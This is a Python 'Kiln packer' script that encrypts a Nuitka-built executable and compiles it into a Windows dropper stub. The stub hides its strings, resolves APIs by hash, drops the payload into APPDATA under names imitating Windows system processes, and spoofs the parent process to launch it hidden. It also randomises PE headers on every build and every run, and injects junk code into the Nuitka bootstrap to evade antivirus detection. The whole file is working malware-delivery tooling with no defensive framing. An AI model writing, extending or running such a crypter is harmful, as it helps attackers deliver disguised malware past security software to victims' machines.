import os, sys, re, secrets, struct, random, subprocess, tempfile, shutil, argparse

# edit to match your VS install
_VC   = r"C:\Program Files\Microsoft Visual Studio\18\Insiders\VC\Tools\MSVC\14.42.34433"
_SDK  = r"C:\Program Files (x86)\Windows Kits\10"
_SDKV = "10.0.26100.0"

_CL   = os.path.join(_VC,  r"bin\Hostx64\x64\cl.exe")
_RC   = os.path.join(_SDK, r"bin", _SDKV, r"x64\rc.exe")

_INCS = [
    os.path.join(_VC,  "include"),
    os.path.join(_SDK, "Include", _SDKV, "ucrt"),
    os.path.join(_SDK, "Include", _SDKV, "um"),
    os.path.join(_SDK, "Include", _SDKV, "shared"),
]
_LIBS = [
    os.path.join(_VC,  r"lib\x64"),
    os.path.join(_SDK, r"Lib", _SDKV, r"um\x64"),
    os.path.join(_SDK, r"Lib", _SDKV, r"ucrt\x64"),
]


# ── helpers ───────────────────────────────────────────────────────────────────

def _rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0; out = bytearray(len(data))
    for k in range(len(data)):
        i = (i+1) % 256; j = (j+S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out[k] = data[k] ^ S[(S[i]+S[j]) % 256]
    return bytes(out)


def _mangle_pe(data: bytes) -> bytes:
    b = bytearray(data)
    if len(b) < 0x40 or b[0:2] != b'MZ':
        return data
    e_lfanew = struct.unpack_from('<I', b, 0x3C)[0]
    if e_lfanew + 24 >= len(b) or b[e_lfanew:e_lfanew+4] != b'PE\x00\x00':
        return data
    rng = random.SystemRandom()

    if e_lfanew > 68:
        b[64:e_lfanew] = secrets.token_bytes(e_lfanew - 64)
        struct.pack_into('<I', b, 0x3C, e_lfanew)
    b[0x04:0x08] = secrets.token_bytes(4)
    b[0x1A:0x1E] = secrets.token_bytes(4)

    struct.pack_into('<I', b, e_lfanew + 8, int.from_bytes(secrets.token_bytes(4), 'little'))

    opt = e_lfanew + 24
    if struct.unpack_from('<H', b, opt)[0] == 0x020B:
        b[opt+2]  = rng.randint(10, 14)
        b[opt+3]  = rng.randint(0,  30)
        struct.pack_into('<H', b, opt+22, rng.randint(0, 9))
        struct.pack_into('<H', b, opt+24, rng.randint(0, 9))
        struct.pack_into('<H', b, opt+40, rng.randint(6, 10))
        struct.pack_into('<H', b, opt+42, rng.randint(0, 3))
        struct.pack_into('<I', b, opt+64, 0)

    ns  = struct.unpack_from('<H', b, e_lfanew + 6)[0]
    osz = struct.unpack_from('<H', b, e_lfanew + 20)[0]
    so  = e_lfanew + 24 + osz
    abc = b'abcdefghijklmnopqrstuvwxyz0123456789_'
    for i in range(ns):
        o = so + i * 40
        if o + 8 > len(b): break
        n = rng.randint(3, 8)
        b[o:o+8] = (bytes(rng.choice(abc) for _ in range(n))).ljust(8, b'\x00')[:8]

    b.extend(secrets.token_bytes(rng.randint(128, 768)))
    return bytes(b)


def _fnv(s: str) -> int:
    h = 0x811C9DC5
    for c in s:
        h = ((h ^ ord(c)) * 0x01000193) & 0xFFFFFFFF
    return h

def _fnvw(s: str) -> int:
    h = 0x811C9DC5
    for c in s.lower():
        h = ((h ^ ord(c))   * 0x01000193) & 0xFFFFFFFF
        h = ((h ^ 0)        * 0x01000193) & 0xFFFFFFFF
    return h

def _xenc(s: str, key: int) -> str:
    return ', '.join(f'0x{b ^ key:02X}' for b in (s + '\0').encode('utf-16-le'))

def _enc_strings(key: int) -> str:
    table = [
        ('crypt',  r'SOFTWARE\Microsoft\Cryptography'),
        ('mguid',  'MachineGuid'),
        ('appd',   'APPDATA'),
        ('drpfmt', r'%s\Microsoft\Windows\%s.exe'),
        ('svc1',   'services.exe'),
        ('svc2',   'svchost.exe'),
        ('svc3',   'explorer.exe'),
        ('adv32',  'advapi32.dll'),
    ]
    out = [
        f'#define _XK 0x{key:02X}U',
        'static void _XD(unsigned char *p,int n){int i;for(i=0;i<n;i++)p[i]^=_XK;}',
    ]
    for name, s in table:
        out.append(f'static unsigned char _e_{name}[]={{{_xenc(s, key)}}};')
    out.append('static void _Dec(void){')
    for name, _ in table:
        out.append(f'    _XD(_e_{name},(int)sizeof(_e_{name}));')
    out.append('}')
    for name, _ in table:
        out.append(f'#define _S_{name.upper()} ((const wchar_t*)_e_{name})')
    return '\n'.join(out)

def _hash_consts() -> str:
    d = {
        'H_ADV32':   _fnvw('advapi32.dll'),
        'H_RegCl':   _fnv('RegCloseKey'),
        'H_RegOKEx': _fnv('RegOpenKeyExW'),
        'H_RegQVEx': _fnv('RegQueryValueExW'),
    }
    return '\n'.join(f'#define {k} 0x{v:08X}U' for k, v in d.items())


def _junk_c() -> tuple:
    rng = random.SystemRandom()
    def rn(p='x'): return p + secrets.token_hex(5)
    ops = ['+', '^', '|', '&', '-', '*']
    lines, arrs, fns = [], [], []

    for _ in range(rng.randint(3, 7)):
        n  = rn('_d'); sz = rng.randint(64, 512)
        lines.append(f'static const unsigned char {n}[]={{{", ".join(f"0x{b:02X}" for b in secrets.token_bytes(sz))}}};')
        arrs.append(n)

    for _ in range(rng.randint(2, 5)):
        fn, var = rn('_f'), rn('v')
        body = '\n'.join(f'    {var} {rng.choice(ops)}= 0x{rng.randint(1,0xFFFFFF):X}UL;'
                         for _ in range(rng.randint(3, 8)))
        lines.append(f'static volatile unsigned long {fn}(unsigned long {var}){{\n{body}\n    return {var};\n}}')
        fns.append(fn)

    sink = rn('_s')
    calls = ' + '.join(f'{fn}({arr}[{rng.randint(0,3)}])' for fn, arr in zip(fns, arrs))
    lines.append(f'static void {sink}(void){{volatile unsigned long _r={calls or 0};(void)_r;}}')
    return '\n\n'.join(lines), sink


# ── C stub ────────────────────────────────────────────────────────────────────

_STUB = r"""
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <intrin.h>

/*__ENC__*/
/*__HASH__*/
/*__JUNK__*/

static const unsigned char _K[]={{{KEY_BYTES}}};
#define _KL {KEY_LEN}

static void _D(unsigned char *d,DWORD dl){{
    unsigned char S[256];int i,j=0;DWORD n;
    for(i=0;i<256;i++)S[i]=(unsigned char)i;
    for(i=0;i<256;i++){{j=(j+S[i]+_K[i%_KL])&0xFF;unsigned char t=S[i];S[i]=S[j];S[j]=t;}}
    i=j=0;
    for(n=0;n<dl;n++){{i=(i+1)&0xFF;j=(j+S[i])&0xFF;unsigned char t=S[i];S[i]=S[j];S[j]=t;d[n]^=S[(S[i]+S[j])&0xFF];}}
}}

static DWORD _H(const char *s){{DWORD h=0x811C9DC5U;while(*s)h=(h^(unsigned char)*s++)*0x01000193U;return h;}}
static DWORD _HW(const wchar_t *s){{
    DWORD h=0x811C9DC5U;
    while(*s){{wchar_t c=*s++;if(c>='A'&&c<='Z')c+=32;h=(h^(unsigned char)c)*0x01000193U;h=(h^(unsigned char)(c>>8))*0x01000193U;}}
    return h;
}}

static PVOID _Mod(DWORD hash){{
    PBYTE peb=(PBYTE)__readgsqword(0x60),ldr=*(PBYTE*)(peb+0x18);
    LIST_ENTRY *head=(LIST_ENTRY*)(ldr+0x20),*cur=head->Flink;
    while(cur!=head){{
        PBYTE e=(PBYTE)cur-0x10;PWSTR n=*(PWSTR*)(e+0x60);
        if(n&&_HW(n)==hash)return *(PVOID*)(e+0x30);
        cur=cur->Flink;
    }}
    return NULL;
}}

static PVOID _Proc(PVOID base,DWORD hash){{
    if(!base)return NULL;
    PBYTE b=(PBYTE)base;
    PIMAGE_NT_HEADERS nt=(PIMAGE_NT_HEADERS)(b+((PIMAGE_DOS_HEADER)b)->e_lfanew);
    DWORD rva=nt->OptionalHeader.DataDirectory[0].VirtualAddress;
    if(!rva)return NULL;
    PIMAGE_EXPORT_DIRECTORY exp=(PIMAGE_EXPORT_DIRECTORY)(b+rva);
    PDWORD names=(PDWORD)(b+exp->AddressOfNames);
    PWORD  ords =(PWORD )(b+exp->AddressOfNameOrdinals);
    PDWORD funcs=(PDWORD)(b+exp->AddressOfFunctions);
    for(DWORD i=0;i<exp->NumberOfNames;i++)
        if(_H((char*)(b+names[i]))==hash)return(PVOID)(b+funcs[ords[i]]);
    return NULL;
}}

typedef LONG(WINAPI*pfRCl)(HKEY);
typedef LONG(WINAPI*pfROK)(HKEY,LPCWSTR,DWORD,REGSAM,PHKEY);
typedef LONG(WINAPI*pfRQV)(HKEY,LPCWSTR,LPDWORD,LPDWORD,LPBYTE,LPDWORD);
static pfRCl _pRCl; static pfROK _pROK; static pfRQV _pRQV;

static void _InitAPIs(void){{
    LoadLibraryW(_S_ADV32);
    PVOID adv=_Mod(H_ADV32);
    if(!adv)return;
    _pRCl=(pfRCl)_Proc(adv,H_RegCl);
    _pROK=(pfROK)_Proc(adv,H_RegOKEx);
    _pRQV=(pfRQV)_Proc(adv,H_RegQVEx);
}}

static unsigned long long _FNV64(const char *s){{
    unsigned long long h=14695981039346656037ULL;
    while(*s){{h^=(unsigned char)*s++;h*=1099511628211ULL;}}
    return h;
}}

static const wchar_t *_Names[]={{
    L"RuntimeBroker",L"SgrmBroker",L"SearchIndexer",L"sppsvc",
    L"MusNotifyIcon",L"MpCopyAccelerator",L"WerFaultSecure",
    L"DeviceCensus",L"UsoClient",L"WinlogonExt",L"svchost32",
    L"CompatTelRunner",L"TiWorker",L"MpSigStub",L"DsSvc"
}};
#define _NSZ 15

static void _DropPath(wchar_t *out,DWORD max){{
    HKEY hk; wchar_t guid[64]=L"default";
    if(_pROK&&_pROK(HKEY_LOCAL_MACHINE,_S_CRYPT,0,KEY_READ|KEY_WOW64_64KEY,&hk)==ERROR_SUCCESS){{
        DWORD sz=sizeof(guid);
        if(_pRQV)_pRQV(hk,_S_MGUID,NULL,NULL,(LPBYTE)guid,&sz);
        if(_pRCl)_pRCl(hk);
    }}
    char nb[64]={{0}};
    WideCharToMultiByte(CP_UTF8,0,guid,-1,nb,64,NULL,NULL);
    wchar_t appd[MAX_PATH]=L"";
    GetEnvironmentVariableW(_S_APPD,appd,MAX_PATH);
    wsprintfW(out,_S_DRPFMT,appd,_Names[(int)(_FNV64(nb)%_NSZ)]);
}}

typedef struct{{DWORD a,b,pid;ULONG_PTR h;DWORD c,d,ppid;LONG e;DWORD f;WCHAR exe[260];}} _PE32W;
HANDLE WINAPI CreateToolhelp32Snapshot(DWORD,DWORD);
BOOL   WINAPI Process32FirstW(HANDLE,_PE32W*);
BOOL   WINAPI Process32NextW(HANDLE,_PE32W*);

static DWORD _FindPid(const wchar_t *name){{
    HANDLE h=CreateToolhelp32Snapshot(2,0);
    if(h==INVALID_HANDLE_VALUE)return 0;
    _PE32W pe;pe.a=sizeof(pe);DWORD pid=0;
    if(Process32FirstW(h,&pe))do{{
        if(lstrcmpiW(pe.exe,name)==0){{pid=pe.pid;break;}}
    }}while(Process32NextW(h,&pe));
    CloseHandle(h);return pid;
}}

static void _Launch(const wchar_t *exe){{
    const wchar_t *par[]={{_S_SVC3,_S_SVC2,_S_SVC1}};
    HANDLE ph=NULL;int i;
    for(i=0;i<3&&!ph;i++){{
        DWORD ppid=_FindPid(par[i]);
        if(ppid)ph=OpenProcess(PROCESS_CREATE_PROCESS,FALSE,ppid);
    }}
    STARTUPINFOEXW six={{{{0}}}};
    six.StartupInfo.cb=sizeof(six);
    six.StartupInfo.dwFlags=STARTF_USESHOWWINDOW;
    six.StartupInfo.wShowWindow=SW_HIDE;
    PROCESS_INFORMATION pi={{0}};
    if(ph){{
        SIZE_T sz=0;
        InitializeProcThreadAttributeList(NULL,1,0,&sz);
        LPPROC_THREAD_ATTRIBUTE_LIST al=(LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(),0,sz);
        if(al&&InitializeProcThreadAttributeList(al,1,0,&sz)){{
            UpdateProcThreadAttribute(al,0,PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,&ph,sizeof(HANDLE),NULL,NULL);
            six.lpAttributeList=al;
            CreateProcessW(exe,NULL,NULL,NULL,FALSE,EXTENDED_STARTUPINFO_PRESENT|CREATE_NO_WINDOW,NULL,NULL,&six.StartupInfo,&pi);
            DeleteProcThreadAttributeList(al);
        }}
        if(al)HeapFree(GetProcessHeap(),0,al);
        CloseHandle(ph);
    }}
    if(!pi.hProcess){{
        STARTUPINFOW si={{sizeof(si)}};
        si.dwFlags=STARTF_USESHOWWINDOW;si.wShowWindow=SW_HIDE;
        CreateProcessW(exe,NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    }}
    if(pi.hProcess){{CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}}
}}

int WINAPI WinMain(HINSTANCE h,HINSTANCE p,LPSTR c,int n){{
    {SINK_CALL}();
    _Dec(); _InitAPIs();

    wchar_t drop[MAX_PATH],dir[MAX_PATH];
    _DropPath(drop,MAX_PATH);
    lstrcpynW(dir,drop,MAX_PATH);
    wchar_t *last=NULL,*pw=dir;
    while(*pw){{if(*pw==L'\\')last=pw;pw++;}}
    if(last)*last=0;

    HMODULE hM=GetModuleHandleW(NULL);
    HRSRC   hr=FindResourceW(hM,L"PAYLOAD",RT_RCDATA);
    if(!hr)return 1;
    HGLOBAL hg=LoadResource(hM,hr);
    DWORD   dl=SizeofResource(hM,hr);
    const unsigned char *rd=(const unsigned char*)LockResource(hg);
    if(!rd||!dl)return 1;

    unsigned char *buf=(unsigned char*)HeapAlloc(GetProcessHeap(),0,dl);
    if(!buf)return 1;
    CopyMemory(buf,rd,dl); _D(buf,dl);

    /* runtime PE mangle before writing — every execution = different file on disk */
    if(dl>0x40&&buf[0]=='M'&&buf[1]=='Z'){{
        DWORD po=*(DWORD*)(buf+0x3C);
        if(po+24<dl&&*(DWORD*)(buf+po)==0x00004550){{
            DWORD s=GetTickCount()^GetCurrentProcessId()^GetCurrentThreadId();
#define _LCG(x) ((x)=((x)*1664525UL+1013904223UL))
            _LCG(s);*(DWORD*)(buf+po+8)=s;
            WORD ns=*(WORD*)(buf+po+6),osz=*(WORD*)(buf+po+20);
            DWORD so=po+24+osz;WORD _i;
            for(_i=0;_i<ns&&so+(DWORD)_i*40+8<dl;_i++){{
                DWORD _j;for(_j=0;_j<8;_j++){{_LCG(s);buf[so+_i*40+_j]=(unsigned char)('a'+s%26);}}
            }}
            if(*(WORD*)(buf+po+24)==0x020B)*(DWORD*)(buf+po+24+64)=0;
            DWORD _k;for(_k=64;_k<po&&_k<dl;_k++){{_LCG(s);buf[_k]=(unsigned char)(s&0xFF);}}
        }}
    }}

    CreateDirectoryW(dir,NULL);

    /* kill & replace any existing copy */
    {{
        const wchar_t *exn=drop,*p2=drop;
        while(*p2){{if(*p2==L'\\')exn=p2+1;p2++;}}
        DWORD ep=_FindPid(exn);
        if(ep){{HANDLE hk=OpenProcess(PROCESS_TERMINATE,FALSE,ep);if(hk){{TerminateProcess(hk,0);CloseHandle(hk);Sleep(600);}}}}
        DeleteFileW(drop);Sleep(200);
    }}

    HANDLE hf=INVALID_HANDLE_VALUE;
    {{int r;for(r=0;r<4&&hf==INVALID_HANDLE_VALUE;r++){{
        hf=CreateFileW(drop,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
        if(hf==INVALID_HANDLE_VALUE)Sleep(800);
    }}}}
    if(hf==INVALID_HANDLE_VALUE){{HeapFree(GetProcessHeap(),0,buf);return 1;}}
    DWORD w=0; WriteFile(hf,buf,dl,&w,NULL);
    CloseHandle(hf); HeapFree(GetProcessHeap(),0,buf);

    Sleep(300); _Launch(drop);
    return 0;
}}
"""


# ── prebuild ──────────────────────────────────────────────────────────────────

def _bootstrap_junk():
    try:
        import nuitka as _nk
        path = os.path.join(os.path.dirname(_nk.__file__),
                            'build', 'static_src', 'OnefileBootstrap.c')
    except ImportError:
        print('[!] nuitka not importable'); return
    if not os.path.exists(path):
        print(f'[!] not found: {path}'); return

    rand = secrets.token_bytes(64)
    rows = ['    ' + ','.join(f'0x{b:02X}' for b in rand[i:i+8]) for i in range(0, 64, 8)]
    block = (
        '/* _ND_BUILD_START_ */\n'
        '#ifdef _WIN32\n'
        '#pragma warning(push)\n'
        '#pragma warning(disable:4100 4206)\n'
        f'static unsigned char const _nbd[64]={{\n' + ',\n'.join(rows) + '\n};\n'
        'static volatile unsigned long long _nbs=0;\n'
        'static void _nbf(void){\n'
        '    unsigned long long _r=14695981039346656037ULL;\n'
        '    int _i;for(_i=0;_i<64;_i++){_r^=(unsigned long long)_nbd[_i];_r*=1099511628211ULL;}\n'
        '    _nbs=_r;\n'
        '}\n'
        '#pragma section(".CRT$XCU",read)\n'
        '__declspec(allocate(".CRT$XCU")) static void(*_nbp)(void)=_nbf;\n'
        '#pragma warning(pop)\n'
        '#endif\n'
        '/* _ND_BUILD_END_ */'
    )

    with open(path, 'r', encoding='utf-8') as f:
        src = f.read()

    if '/* _ND_BUILD_START_ */' in src:
        src = re.sub(r'/\* _ND_BUILD_START_ \*/.*?/\* _ND_BUILD_END_ \*/',
                     block, src, flags=re.DOTALL)
    else:
        idx = src.find('static void fatalError(')
        if idx == -1:
            print('[!] injection point not found — Nuitka version mismatch'); return
        src = src[:idx] + block + '\n\n' + src[idx:]

    with open(path, 'w', encoding='utf-8') as f:
        f.write(src)
    print(f'[+] bootstrap junk: {rand[:4].hex()}...')


def _py_junk(src_path: str):
    rng = random.SystemRandom()
    def rn(p='_x'): return p + secrets.token_hex(4)
    def ri(): return rng.randint(1, 0xFFFFFF)

    lines = ['# per-build junk -- do not edit', 'import sys as _s', '']
    fns, consts = [], []

    for _ in range(rng.randint(3, 5)):
        cn = rn('_C')
        lines.append(f'{cn} = ({", ".join(str(ri()) for _ in range(rng.randint(3,5)))},)')
        consts.append(cn)
    lines.append('')

    ops = ['+', '-', '^', '|', '&']
    for _ in range(rng.randint(3, 5)):
        fn, arg = rn('_f'), rn('v')
        body = [f'    {arg} = {ri()}']
        for _ in range(rng.randint(2, 5)):
            body.append(f'    {arg} {rng.choice(ops)}= {ri()}')
        body.append(f'    return {arg} & 0xFFFFFFFF')
        lines += [f'def {fn}({arg}=0):'] + body + ['']
        fns.append(fn)

    acc = rn('_A')
    seed = rng.choice(consts) if consts else '(1,)'
    calls = [f'    _r = {fns[0]}({seed}[0])'] if fns else ['    _r = 0']
    for fn in fns[1:]:
        c = rng.choice(consts)
        calls.append(f'    _r ^= {fn}({c}[{rng.randint(0,2)}])')
    calls.append('    return _r')
    lines += [f'def {acc}():'] + calls + ['', f'_SINK = {acc}()', '']

    jnk_path = os.path.join(os.path.dirname(os.path.abspath(src_path)), '_jnk.py')
    with open(jnk_path, 'w', encoding='utf-8') as f:
        f.write('\n'.join(lines))
    print(f'[+] junk module: {jnk_path}')

    with open(src_path, 'r', encoding='utf-8') as f:
        src = f.read()
    inject = 'import _jnk\n'
    if inject not in src:
        idx = src.rfind('sys.path.insert')
        idx = src.find('\n', idx) + 1 if idx != -1 else 0
        src = src[:idx] + inject + src[idx:]
        with open(src_path, 'w', encoding='utf-8') as f:
            f.write(src)
        print(f'[+] injected import into {os.path.basename(src_path)}')


def cmd_prebuild(args):
    if not os.path.exists(args.src):
        print(f'[-] not found: {args.src}'); sys.exit(1)
    _bootstrap_junk()
    _py_junk(args.src)


# ── packer ────────────────────────────────────────────────────────────────────

def cmd_pack(args):
    if not os.path.exists(args.input):
        print(f'[-] not found: {args.input}'); sys.exit(1)
    if not os.path.exists(_CL):
        print(f'[-] cl.exe not found — check _VC path at top of pack.py'); sys.exit(1)

    print(f'[*] {args.input} ({os.path.getsize(args.input):,} bytes)')
    with open(args.input, 'rb') as f:
        raw = f.read()

    raw     = _mangle_pe(raw)
    key     = secrets.token_bytes(32)
    enc     = _rc4(key, raw)
    xk      = secrets.randbits(8)
    junk, sink = _junk_c()
    key_hex = ', '.join(f'0x{b:02X}' for b in key)

    c_src = _STUB.format(KEY_BYTES=key_hex, KEY_LEN=len(key), SINK_CALL=sink)
    c_src = c_src.replace('/*__ENC__*/',  _enc_strings(xk))
    c_src = c_src.replace('/*__HASH__*/', _hash_consts())
    c_src = c_src.replace('/*__JUNK__*/', junk)

    tmp = tempfile.mkdtemp(prefix='nd_')
    try:
        enc_path = os.path.join(tmp, 'p.enc')
        with open(enc_path, 'wb') as f: f.write(enc)

        rc_path = os.path.join(tmp, 'stub.rc')
        with open(rc_path, 'w') as f:
            f.write(f'PAYLOAD RCDATA "{enc_path.replace(chr(92), "/")}"\n')

        c_path = os.path.join(tmp, 'stub.c')
        with open(c_path, 'w', encoding='utf-8') as f: f.write(c_src)

        res_path = os.path.join(tmp, 'stub.res')
        r = subprocess.run([_RC, '/nologo', '/fo', res_path, rc_path],
                           capture_output=True, text=True)
        if r.returncode != 0:
            print(f'[-] rc.exe:\n{r.stderr}'); sys.exit(1)

        out_abs = os.path.abspath(args.output)
        env = os.environ.copy(); env.pop('CL', None)
        r = subprocess.run([
            _CL, c_path, res_path,
            '/nologo', '/O1', '/GS-', '/W0', '/MT',
            f'/Fe{out_abs}', f'/Fo{tmp}\\',
        ] + [f'/I{p}' for p in _INCS]
          + ['/link', '/SUBSYSTEM:WINDOWS']
          + [f'/LIBPATH:{p}' for p in _LIBS]
          + ['kernel32.lib', 'user32.lib'],
          capture_output=True, text=True, env=env)
        if r.returncode != 0:
            print(f'[-] cl.exe:\n{r.stderr}\n{r.stdout}'); sys.exit(1)

        print(f'[+] {out_abs} ({os.path.getsize(out_abs):,} bytes)')
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


# ── cli ───────────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(prog='pack.py', description='Kiln packer')
    sub = ap.add_subparsers(dest='cmd', required=True)

    pb = sub.add_parser('prebuild', help='inject bootstrap junk + py junk module')
    pb.add_argument('src', help='entry point .py file')

    pk = sub.add_parser('pack', help='RC4-encrypt + compile C stub')
    pk.add_argument('input',  help='Nuitka-compiled .exe')
    pk.add_argument('output', help='output payload.exe')

    args = ap.parse_args()
    {'prebuild': cmd_prebuild, 'pack': cmd_pack}[args.cmd](args)


if __name__ == '__main__':
    main()
